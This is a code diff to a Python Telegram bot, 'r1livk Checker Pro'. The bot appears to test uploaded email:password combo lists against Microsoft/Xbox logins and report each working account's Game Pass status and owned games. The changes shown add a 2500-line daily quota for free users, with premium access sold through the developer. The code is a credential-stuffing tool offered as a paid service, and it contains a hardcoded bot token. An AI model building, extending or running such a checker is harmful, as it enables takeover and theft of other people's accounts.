@@ -7,6 +7,7 @@ import os
 import re
 import time
 import threading
+from datetime import date
 from concurrent.futures import ThreadPoolExecutor
 import requests
 import urllib3
@@ -21,9 +22,28 @@ TOKEN = "8896382526:AAFMror2dFQ1U0r6RRHrrya2PKuyuoTRtnw"
 bot = telebot.TeleBot(TOKEN)
 
 REQUEST_TIMEOUT = 25
-MAX_THREADS = 10  # خفضنا التعداد شوي لضمان ثبات استخراج الـ Device Tokens
+MAX_THREADS = 10
 
 active_scans = {}
+user_usage = {}  # لتتبع الاستخدام اليومي: {chat_id: {"date": date.today(), "count": lines_checked}}
+DAILY_LIMIT = 2500
+
+def check_daily_limit(chat_id, new_lines_count):
+    today = date.today()
+    if chat_id not in user_usage or user_usage[chat_id]["date"] != today:
+        user_usage[chat_id] = {"date": today, "count": 0}
+    
+    current_used = user_usage[chat_id]["count"]
+    if current_used >= DAILY_LIMIT:
+        return False, 0
+    
+    allowed_lines = min(new_lines_count, DAILY_LIMIT - current_used)
+    return True, allowed_lines
+
+def update_usage(chat_id, count):
+    today = date.today()
+    if chat_id in user_usage and user_usage[chat_id]["date"] == today:
+        user_usage[chat_id]["count"] += count
 
 def extract_ppft(text):
     patterns = [
@@ -60,7 +80,6 @@ def fetch_xbox_extra_details_pro(session, xb_token, uhs):
     owned_games_formatted = []
     
     try:
-        # محاكاة تطبيق ويندوز والحصول على صلاحيات الـ Store / Catalog الكاملة
         xsts_xb_payload = {
             "Properties": {
                 "SandboxId": "RETAIL",
@@ -79,7 +98,6 @@ def fetch_xbox_extra_details_pro(session, xb_token, uhs):
                 "x-xbl-contract-version": "4"
             }
             
-            # 1. فحص الجيم باس
             sub_headers = headers.copy()
             sub_headers["x-xbl-contract-version"] = "2"
             sub_req = session.get("https://purchase.xboxlive.com/users/me/subscriptions", headers=sub_headers, timeout=10)
@@ -91,7 +109,6 @@ def fetch_xbox_extra_details_pro(session, xb_token, uhs):
                         game_pass_status = f"Active ✅ ({sub.get('name', 'Game Pass')})"
                         break
 
-            # 2. جلب الـ XUID بدقة
             xuid = None
             people_resp = session.get("https://peoplehub.xboxlive.com/users/me/people/social/summary", headers=headers, timeout=10)
             if people_resp.status_code == 200:
@@ -107,7 +124,6 @@ def fetch_xbox_extra_details_pro(session, xb_token, uhs):
                     except:
                         pass
 
-            # 3. سحب الألعاب عبر Inventory Entitlements API
             if xuid:
                 entitlements_url = f"https://inventory.xboxlive.com/users/xuid({xuid})/inventory/products?type=Game"
                 ent_resp = session.get(entitlements_url, headers=headers, timeout=10)
@@ -128,7 +144,6 @@ def fetch_xbox_extra_details_pro(session, xb_token, uhs):
                             if counter > 20:
                                 break
 
-            # 4. خطة بديلة لو الـ Inventory ما رجع بيانات
             if not owned_games_formatted and xuid:
                 history_url = f"https://achievements.xboxlive.com/users/xuid({xuid})/history/titles"
                 history_resp = session.get(history_url, headers=headers, timeout=10)
@@ -315,10 +330,14 @@ def send_welcome(message):
     btn_account = types.InlineKeyboardButton("👤 My Account", callback_data="my_account")
     markup.add(btn_start, btn_premium, btn_account)
 
+    chat_id = message.chat.id
+    today = date.today()
+    used = user_usage.get(chat_id, {}).get("count", 0) if user_usage.get(chat_id, {}).get("date") == today else 0
+
     text = (
         "⚡ **r1livk Checker Pro (Catalog Mode)** ⚡\n\n"
         "Welcome to the ultimate account checking bot.\n"
-        "Your Status: 👤 Free (0/2500 lines today)\n\n"
+        f"Your Status: 👤 Free ({used}/2500 lines today)\n\n"
         "Features:\n"
         "• Xbox Game Pass & Subscriptions\n"
         "• DisplayCatalog & Inventory Games List\n"
@@ -362,7 +381,9 @@ def callback_query(call):
         bot.answer_callback_query(call.id, "To buy the premium version, please contact the developer: @r1livk", show_alert=True)
 
     elif call.data == "my_account":
-        bot.answer_callback_query(call.id, "Current Status: Free\nDaily Limit: 2500 lines", show_alert=True)
+        today = date.today()
+        used = user_usage.get(chat_id, {}).get("count", 0) if user_usage.get(chat_id, {}).get("date") == today else 0
+        bot.answer_callback_query(call.id, f"Current Status: Free\nUsed Today: {used}/2500 lines", show_alert=True)
 
 @bot.message_handler(content_types=['document'])
 def handle_docs(message):
@@ -375,17 +396,25 @@ def handle_docs(message):
         with open(local_path, 'wb') as f:
             f.write(downloaded_file)
 
-        bot.reply_to(message, "📥 File received. Starting Catalog scan...")
+        with open(local_path, 'r', encoding='utf-8-sig', errors='ignore') as f:
+            lines = [line.strip() for line in f if line.strip() and ':' in line]
+
+        allowed, lines_to_process_count = check_daily_limit(chat_id, len(lines))
+        if not allowed or lines_to_process_count <= 0:
+            bot.reply_to(message, "⚠️ Daily limit reached! You have already checked 2500 lines today. Upgrade to Premium for unlimited checks.")
+            if os.path.exists(local_path):
+                os.remove(local_path)
+            return
+
+        lines = lines[:lines_to_process_count]
+        bot.reply_to(message, f"📥 File received. Processing {len(lines)} lines (Daily quota applied)...")
         active_scans[chat_id] = True
-        threading.Thread(target=process_checker, args=(chat_id, local_path)).start()
+        threading.Thread(target=process_checker, args=(chat_id, local_path, lines)).start()
 
     except Exception as e:
         bot.reply_to(message, f"Error downloading file: {e}")
 
-def process_checker(chat_id, filepath):
-    with open(filepath, 'r', encoding='utf-8-sig', errors='ignore') as f:
-        lines = [line.strip() for line in f if line.strip() and ':' in line]
-
+def process_checker(chat_id, filepath, lines):
     total = len(lines)
     checked = 0
     hits = 0
@@ -491,6 +520,8 @@ def process_checker(chat_id, filepath):
                 except:
                     pass
             time.sleep(1.5)
+
+    update_usage(chat_id, total)
 
     elapsed_total = int(time.time() - start_time)
     t_mins, t_secs = divmod(elapsed_total, 60)
